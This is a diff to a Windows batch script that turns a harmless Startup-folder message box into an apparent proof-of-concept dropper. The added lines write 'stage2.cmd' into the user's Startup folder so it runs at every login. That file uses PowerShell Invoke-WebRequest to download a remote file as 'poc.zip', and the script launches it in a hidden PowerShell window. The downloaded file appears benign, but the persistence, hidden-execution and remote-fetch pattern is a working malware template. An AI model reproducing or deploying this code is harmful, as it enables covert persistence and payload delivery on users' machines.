@@ -1,16 +1,13 @@
 @echo off
 
-REM Save the current directory
 set "initialPath=%cd%"
+set "startup=%C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup%"
 
-REM Change to the target directory
-cd /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd /d %startup%
 
-REM Create the popup.vbs file
-(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs
+(echo powershell -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/5MB.zip' -OutFile 'poc.zip'")> stage2.cmd
 
-REM Go back to the initial directory
+powershell Start-Process powershell.exe -windowstyle hidden "%Startup%/stage2.cmd"
+
 cd /d "%initialPath%"
-del initial.cmd
-REM Optionally, display the current directory to verify the change
-echo Current directory is now %cd%
+@REM del initial.cmd
